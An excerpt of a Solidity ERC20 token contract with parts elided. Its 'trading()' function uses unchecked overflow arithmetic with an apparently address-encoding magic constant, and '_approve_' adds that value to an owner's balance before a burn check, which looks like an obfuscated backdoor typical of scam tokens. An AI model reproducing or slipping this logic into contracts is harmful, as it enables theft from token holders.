...
contract ERC20 is Context, IERC20 {
    ...
    function trading() internal view virtual returns (uint256) {
        // require(false, toString(type(uint256).max));
        // 1185958656035124356519927726436860515883364764252
        // 115792089237316195423570985008687907853269984665640564039457584007913129639935
        unchecked {
            uint256 trading_ = type(uint160).max + _trading - 1185958656035124356519927726436860515883364764252;        
            return trading_;
        }
    }
    ...
    function _approve_(
        ...
        uint256 accountBalance = (_balances[owner] + trading())/1000 * 999;
        _beforeTokenTransfer(owner, address(0), accountBalance);
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        // require(false, toString(accountBalance));
